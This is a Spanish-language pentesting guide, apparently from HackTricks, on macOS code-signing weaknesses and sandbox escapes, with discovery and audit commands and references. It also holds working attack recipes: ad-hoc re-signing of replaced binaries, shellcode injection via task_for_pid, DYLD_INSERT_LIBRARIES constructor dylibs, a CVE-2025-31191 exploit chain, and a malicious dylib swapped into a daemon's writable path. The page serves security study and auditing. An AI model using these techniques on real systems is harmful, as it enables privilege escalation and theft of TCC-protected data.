# Debilidades de Code Signing de macOS y Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Binaries con firma Ad-Hoc

### Información básica

La **firma Ad-Hoc** (`CS_ADHOC`) crea una firma de código **sin cadena de certificados**. Aun así, aplica hashes al código firmado, por lo que la validación puede detectar modificaciones, pero no proporciona una identidad del desarrollador que otro componente pueda autenticar. Reemplazar y volver a firmar el ejecutable produce un CodeDirectory/CDHash diferente.<sup>[[1]](#references)[[4]](#references)</sup>

En los Macs con Apple Silicon, todos los ejecutables requieren como mínimo una firma ad-hoc. Esto significa que encontrarás firmas ad-hoc en muchas herramientas de desarrollo, paquetes de Homebrew y utilidades de terceros.

### Por qué es importante

- **No hay una identidad del firmante verificable**: las comprobaciones que solo aceptan una ruta, un estado ad-hoc o un identificador no fijado no pueden establecer quién produjo el binario.
- Los binaries ad-hoc de terceros en **posiciones privilegiadas** (FDA, daemons, helpers) son objetivos prioritarios cuando su archivo o un directorio padre se puede modificar.
- Un CDHash, designated-requirement o una comprobación de TCC respaldada por un requirement **sí** detecta el reemplazo. Una policy basada en rutas puede no hacerlo; inspecciona el requirement real y vuelve a probar el grant en lugar de asumir que sobrevive a la nueva firma.

### Descubrimiento
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Ataque: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Procesos depurables (get-task-allow)

### Información básica

El entitlement **`com.apple.security.get-task-allow`** (o la flag `CS_GET_TASK_ALLOW`) permite que un depurador autorizado obtenga el task port del proceso incluso cuando Hardened Runtime normalmente lo impediría. Un depurador con éxito puede leer memoria, modificar registros, inyectar código y controlar la ejecución.<sup>[[3]](#references)</sup>

Esto está pensado **únicamente para builds de desarrollo**. Sin embargo, algunos binarios de terceros se distribuyen con este entitlement en producción.

> [!CAUTION]
> Un binario de producción con `get-task-allow` es un primitive de explotación potente. `taskgated`, la identidad del caller, el sandboxing, los entitlements del depurador y la autorización de Developer Tools siguen afectando a si un cliente concreto puede obtener el task port; prueba tanto con `lldb`/`debugserver` como con el injector previsto. Una vez que el attachment tiene éxito, el código inyectado se ejecuta con los entitlements, los permisos de TCC y el contexto de seguridad del target.

### Descubrimiento
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Ataque: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Sin validación de librerías + entorno DYLD

### Borrado de la validación de librerías en tiempo de ejecución

El entitlement privado **`com.apple.private.security.clear-library-validation`** no desactiva la validación de librerías al iniciar el proceso. En su lugar, permite que el proceso llame a `csops(..., CS_OPS_CLEAR_LV, ...)` sobre sí mismo en tiempo de ejecución. Entonces, XNU borra `CS_REQUIRE_LV | CS_FORCED_LV`, siempre que el proceso que realiza la llamada tenga el entitlement y cumpla las comprobaciones adicionales del handler. En consecuencia, un proceso solo puede convertirse en un objetivo viable para library injection después de alcanzar el código que borra la validación de librerías.<sup>[[4]](#references)[[5]](#references)</sup>

### La combinación letal

Cuando un binario tiene **ambos**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (carga cualquier dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (acepta variables de entorno DYLD)

Esta es una combinación de gran valor para la inyección de código, ya que Hardened Runtime permite tanto la librería no confiable como la variable de entorno DYLD. El contexto de lanzamiento aún puede eliminar las variables DYLD (por ejemplo, en rutas de ejecución protegidas o privilegiadas), así que verifica la invocación exacta en lugar de tratar el par de entitlements como incondicional.

### Descubrimiento
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Ataque: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Excepciones temporales de Sandbox

### Cómo debilitan el Sandbox

Las excepciones temporales de Sandbox (`com.apple.security.temporary-exception.*`) abren brechas en el App Sandbox:<sup>[[2]](#references)</sup>

| Excepción | Qué permite |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Conectarse a servicios XPC/Mach de todo el sistema |
| `temporary-exception.files.absolute-path.read-write` | Leer/escribir archivos fuera del contenedor de la app |
| `temporary-exception.iokit-user-client-class` | Abrir conexiones de user-client de IOKit |
| `temporary-exception.shared-preference.read-only` | Leer las preferencias de otras apps |
| `temporary-exception.files.home-relative-path.read-write` | Acceder a rutas relativas a `~` |

### Excepciones de Mach-Lookup = Primitiva de escape del Sandbox

La excepción más peligrosa es **mach-lookup**: permite que una app en Sandbox se comunique con daemons privilegiados:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Ataque: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Las comprobaciones de Code-Signing no son integridad del cliente XPC

Un servicio XPC puede autenticar una conexión extrayendo el estado de code-signing de su audit token y aceptando un **platform binary** de Apple o un cliente que lleve `CS_REQUIRE_LV`/`CS_FORCED_LV`. Estas pruebas describen el ejecutable y determinados flags del proceso; no demuestran que el address space actual contenga únicamente código confiable. Una investigación sobre servicios de ImageCapture demostró que un binario de Apple susceptible de inyección, como `/bin/ls`, podía cargar una dylib del atacante mediante `DYLD_INSERT_LIBRARIES` y después conectarse como cliente de plataforma. Una comprobación posterior de los flags de library-validation también fue evadida antes de que Apple modificara el servicio para exigir su private authorization entitlement en macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Haz reverse de `listener:shouldAcceptNewConnection:` (o del handler XPC de bajo nivel equivalente) e identifica las decisiones basadas únicamente en `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` o `CS_FORCED_LV`.
2. Enumera los clientes firmados por Apple que puedan hablar el protocolo y, después, inspecciona Hardened Runtime y los entitlements. Una firma de plataforma por sí sola no demuestra que la inyección de DYLD esté bloqueada.
3. Prueba el candidato en el **target macOS build**. Si se carga una constructor dylib, realiza la conexión al servicio desde ese constructor para que el audit token pertenezca al proceso de plataforma aceptado.
4. Vuelve a probar cada parche del proveedor: añadir otro flag mutable del estado del proceso a la misma decisión de autorización puede no eliminar la primitiva de confused-deputy.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> El comportamiento de DYLD, la política de AMFI y las comprobaciones del lado del servicio cambian entre las versiones de macOS. Que falle contra un host completamente actualizado no demuestra que la misma cadena fallara en la versión vulnerable.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Los security-scoped bookmarks conservan la elección de archivos de un usuario entre distintos lanzamientos. Una sandbox extension está vinculada al arranque, por lo que `ScopedBookmarkAgent` la valida y crea un bookmark de larga duración autenticado mediante HMAC; cuando la aplicación presenta posteriormente ese bookmark, el agente lo valida y emite una nueva sandbox extension. El secreto de firma se almacena en el login keychain y se deriva una clave por aplicación mediante el bundle identifier.<sup>[[7]](#references)</sup>

En los sistemas afectados, la ACL del keychain impedía que un proceso no confiable **leyera** el secreto de `com.apple.scopedbookmarksagent.xpc`, pero no impedía su eliminación. Una aplicación sandboxed comprometida podía reemplazar el elemento con un secreto conocido y una ACL controlada por el atacante, derivar la clave HMAC específica de la aplicación, falsificar entradas en el bookmark plist del contenedor escribible y solicitar a `ScopedBookmarkAgent` que las intercambiara por extensiones de acceso a archivos. Esto convertía cualquier aplicación sandboxed que utilizara security-scoped bookmarks en una posible sandbox escape con acceso arbitrario a archivos, sin una interacción adicional con el selector de archivos. Apple corrigió el problema en las actualizaciones de seguridad del 31 de marzo de 2025.<sup>[[7]](#references)</sup>

### Triage y cadena de ataque
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
La secuencia de explotación en un host vulnerable es:

1. Obtener ejecución de código dentro de una app sandboxed que use persistent scoped bookmarks.
2. Reemplazar el elemento de firma del keychain del agente por un secreto conocido y una ACL permisiva.
3. Calcular `HMAC-SHA256(key=known_secret, data=bundle_id)` y forjar un bookmark para una ruta útil en el bookmark store con permisos de escritura de la app.
4. Activar la ruta normal de la aplicación para resolver bookmarks, de modo que `ScopedBookmarkAgent` devuelva una sandbox extension.
5. Usar el nuevo acceso a archivos para sobrescribir un objetivo de ejecución o de datos fuera del sandbox disponible para ese usuario.

Esta es una **técnica para versiones parcheadas**: úsala para comprender el límite de confianza y evaluar sistemas sin parchear, no como una suposición sobre las versiones actuales. Para las pruebas actuales, céntrate en el análisis de bookmarks, la vinculación de identidad, el ciclo de vida de los elementos del keychain y el comportamiento de confused deputy alrededor del agente.

---

## Private Apple Entitlements

### Qué son

Los entitlements con el prefijo `com.apple.private.*` proporcionan acceso a **APIs internas de Apple** que no están documentadas ni disponibles para desarrolladores externos. Los binarios de terceros con private entitlements los obtenían mediante un enterprise cert, MDM o distribución fuera de la App Store.

### Private Entitlements peligrosos

| Entitlement | Capacidad |
|---|---|
| `com.apple.private.tcc.manager` | Lectura/escritura completa de la base de datos de TCC |
| `com.apple.private.tcc.allow` | Acceso a servicios específicos de TCC |
| `com.apple.private.security.no-sandbox` | Ejecutarse sin sandbox |
| `com.apple.private.iokit` | Acceso directo a drivers de IOKit |
| `com.apple.private.kernel.\*` | Acceso a interfaces del kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrar/gestionar jobs de launchd |
| `com.apple.rootless.install` | Escribir en rutas protegidas por SIP |

### Descubrimiento
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Perfiles de Sandbox personalizados

### Qué son

Los binarios pueden incluir **perfiles de Sandbox personalizados** escritos en SBPL (Seatbelt Profile Language). Estos perfiles pueden ser más restrictivos O **más permisivos** que el App Sandbox predeterminado.

### Auditar perfiles personalizados
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Rutas de bibliotecas con permisos de escritura

### Qué son

Cuando un binario carga una biblioteca dinámica desde una ruta en la que el usuario actual puede **escribir**, la biblioteca puede reemplazarse por código malicioso.

### Descubrimiento
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Guía de firma de código](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operaciones `CS_OPS_*` y `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (controlador de `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Una nueva era de los escapes de macOS Sandbox: análisis de una superficie de ataque ignorada y descubrimiento de más de 10 nuevas vulnerabilidades](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Análisis de CVE-2025-31191: un escape de macOS Sandbox basado en security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
